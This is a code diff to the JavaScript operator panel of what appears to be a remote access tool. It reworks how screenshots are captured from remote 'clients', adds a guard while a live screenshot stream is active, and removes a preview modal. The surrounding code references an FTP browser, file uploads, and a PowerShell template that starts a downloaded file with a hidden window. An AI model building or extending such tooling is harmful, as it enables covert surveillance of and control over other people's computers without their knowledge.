@@ -483,10 +483,19 @@ const RunApp = (() => {
 
         const screenshotBtn = $('enable-screenshot-btn');
         const screenshotPill = $('screenshot-status-pill');
+        const singleBtn = $('single-screenshot-btn');
+        const isCapturing = !!runState.popupUser?.capture;
         if (screenshotBtn) {
-            const isCapturing = !!runState.popupUser?.capture;
             screenshotBtn.classList.toggle('active', isCapturing);
             if (screenshotPill) screenshotPill.textContent = isCapturing ? 'ON' : 'OFF';
+        }
+        if (singleBtn) {
+            singleBtn.classList.toggle('disabled', isCapturing);
+            if (isCapturing) {
+                singleBtn.setAttribute('title', 'Screenshot Stream is active. Single capture disabled while streaming.');
+            } else {
+                singleBtn.removeAttribute('title');
+            }
         }
 
         const vol = $('spk-volume');
@@ -760,106 +769,53 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
     }
 
     // ═══════════════════════════════════════════════════════════════
-    // SCREENSHOT CAPTURE PREVIEW MODULE
+    // SCREENSHOT CAPTURE (SINGLE-CLICK TAKE & REDIRECT)
     // ═══════════════════════════════════════════════════════════════
-
-    const screenshotModalState = {
-        isOpen: false,
-        user: null,
-        data: null
-    };
-
-    function openScreenshotModal(user) {
-        if (!user) return;
-        screenshotModalState.isOpen = true;
-        screenshotModalState.user = user;
-        screenshotModalState.data = null;
-
-        const modal = $('screenshot-modal');
-        if (!modal) return;
-
-        const targetEl = $('screenshot-target-user');
-        if (targetEl) targetEl.textContent = `Client: ${getDisplayUsername(user.username)}`;
-
-        const loading = $('screenshot-loading');
-        const loadingText = $('screenshot-loading-text');
-        const imgWrap = $('screenshot-img-wrap');
-        const metaBar = $('screenshot-meta-bar');
-        const img = $('screenshot-preview-img');
-
-        if (loading) loading.style.display = 'flex';
-        if (loadingText) loadingText.textContent = `Capturing screenshot from ${getDisplayUsername(user.username)}...`;
-        if (imgWrap) imgWrap.style.display = 'none';
-        if (metaBar) metaBar.style.display = 'none';
-        if (img) img.src = '';
-
-        modal.style.display = 'flex';
-    }
-
-    function closeScreenshotModal() {
-        screenshotModalState.isOpen = false;
-        const modal = $('screenshot-modal');
-        if (modal) modal.style.display = 'none';
-    }
-
-    function renderScreenshotPreview(data) {
-        screenshotModalState.data = data;
-        const img = $('screenshot-preview-img');
-        const imgWrap = $('screenshot-img-wrap');
-        const loading = $('screenshot-loading');
-        const metaBar = $('screenshot-meta-bar');
-
-        if (!img || !imgWrap) return;
-
-        img.onload = () => {
-            if (loading) loading.style.display = 'none';
-            if (imgWrap) imgWrap.style.display = 'flex';
-            if (metaBar) metaBar.style.display = 'flex';
-        };
-
-        img.onerror = () => {
-            if (loading) loading.style.display = 'none';
-            alert('Failed to render captured frame.');
-            closeScreenshotModal();
-        };
-
-        img.src = data.url;
-
-        const fileLabel = $('screenshot-filename-label');
-        const timeLabel = $('screenshot-time-label');
-        if (fileLabel) fileLabel.textContent = data.filename || 'screenshot.jpg';
-        if (timeLabel) timeLabel.textContent = data.isDemo ? 'Demo simulation' : `Captured ${new Date().toLocaleTimeString()}`;
-    }
 
     async function doTakeSingleScreenshot() {
         if (isSendingCommand) return;
         const user = runState.popupUser;
         if (!user) return;
 
-        const btn = $('single-screenshot-btn');
-        if (btn) {
-            btn.style.pointerEvents = 'none';
-            btn.style.opacity = '0.6';
+        if (user.capture) {
+            alert('Cannot capture screenshot while Screenshot Stream is active.');
+            return;
         }
 
-        openScreenshotModal(user);
+        const btn = $('single-screenshot-btn');
+        const iconWrap = btn?.querySelector('.script-icon-wrap');
+        const originalIcon = iconWrap ? iconWrap.innerHTML : '';
+
+        if (btn) {
+            btn.style.pointerEvents = 'none';
+            btn.style.opacity = '0.7';
+            if (iconWrap) {
+                iconWrap.innerHTML = '<i class="bi bi-arrow-repeat" style="display:inline-block;animation:spin 0.8s linear infinite;"></i>';
+            }
+        }
+
+        const restoreBtn = () => {
+            if (btn) {
+                btn.style.pointerEvents = '';
+                btn.style.opacity = '';
+                if (iconWrap && originalIcon) iconWrap.innerHTML = originalIcon;
+            }
+        };
 
         if (!runState.isConnected || user.demo) {
             // Demo mode simulation
             setTimeout(() => {
-                if (btn) {
-                    btn.style.pointerEvents = '';
-                    btn.style.opacity = '';
+                restoreBtn();
+                closePopup();
+                if (typeof window.__switchMode === 'function') {
+                    window.__switchMode('frames');
+                } else {
+                    $('brandToggle')?.click();
                 }
-                const demoTimestamp = new Date().toISOString().replace(/\D/g, '').substring(0, 17);
-                const mockFilename = `${demoTimestamp}.jpg`;
-                renderScreenshotPreview({
-                    username: user.username,
-                    filename: mockFilename,
-                    url: 'https://images.unsplash.com/photo-1550745165-9bc0b252726f?auto=format&fit=crop&w=1200&q=80',
-                    isDemo: true
-                });
-            }, 900);
+                if (typeof FramesApp !== 'undefined') {
+                    FramesApp.loadFolder(user.username);
+                }
+            }, 500);
             return;
         }
 
@@ -876,58 +832,23 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             }
 
             const data = await res.json();
-            renderScreenshotPreview(data);
+            restoreBtn();
+
+            // Redirect user to the frames page for this user and focused on this frame!
+            closePopup();
+            if (typeof window.__switchMode === 'function') {
+                window.__switchMode('frames');
+            } else {
+                $('brandToggle')?.click();
+            }
+
+            if (typeof FramesApp !== 'undefined') {
+                FramesApp.loadFolder(data.username || user.username, data.filename);
+            }
         } catch (err) {
-            const loading = $('screenshot-loading');
-            if (loading) loading.style.display = 'none';
+            restoreBtn();
             alert(err.message || 'Failed to capture screenshot.');
-            closeScreenshotModal();
-        } finally {
-            if (btn) {
-                btn.style.pointerEvents = '';
-                btn.style.opacity = '';
-            }
         }
-    }
-
-    function initScreenshotModal() {
-        $('screenshot-close-btn')?.addEventListener('click', closeScreenshotModal);
-
-        $('screenshot-retake-btn')?.addEventListener('click', () => {
-            if (screenshotModalState.user) {
-                doTakeSingleScreenshot();
-            }
-        });
-
-        $('screenshot-open-frames-btn')?.addEventListener('click', () => {
-            const targetUser = screenshotModalState.user?.username || screenshotModalState.data?.username;
-            if (targetUser) {
-                closeScreenshotModal();
-                closePopup();
-                const cur = window.__getCurrentMode ? window.__getCurrentMode() : 'run';
-                if (cur !== 'frames') {
-                    $('brandToggle')?.click();
-                }
-                if (typeof FramesApp !== 'undefined') {
-                    FramesApp.loadFolder(targetUser);
-                }
-            }
-        });
-
-        $('screenshot-download-btn')?.addEventListener('click', () => {
-            const data = screenshotModalState.data;
-            if (!data?.url) return;
-            const a = document.createElement('a');
-            a.href = data.url;
-            a.download = data.filename || 'screenshot.jpg';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-        });
-
-        $('screenshot-modal')?.addEventListener('click', e => {
-            if (e.target === $('screenshot-modal')) closeScreenshotModal();
-        });
     }
 
     // ═══════════════════════════════════════════════════════════════
@@ -2610,7 +2531,6 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         $('delete-screenshots-btn')?.addEventListener('click', doDeleteAllScreenshots);
         initFtpBrowser();
         initLogsModal();
-        initScreenshotModal();
 
         const fileUpload = $('file-upload');
         if (fileUpload) {
@@ -2636,17 +2556,6 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
 
         // Global keyboard shortcuts
         document.addEventListener('keydown', e => {
-            if (screenshotModalState.isOpen) {
-                if (e.key === 'Escape') {
-                    closeScreenshotModal();
-                    return;
-                }
-                if (e.key === 'r' || e.key === 'R') {
-                    e.preventDefault();
-                    doTakeSingleScreenshot();
-                    return;
-                }
-            }
             if (logsState.isOpen) {
                 if (e.key === 'Escape') {
                     closeLogsModal(true);
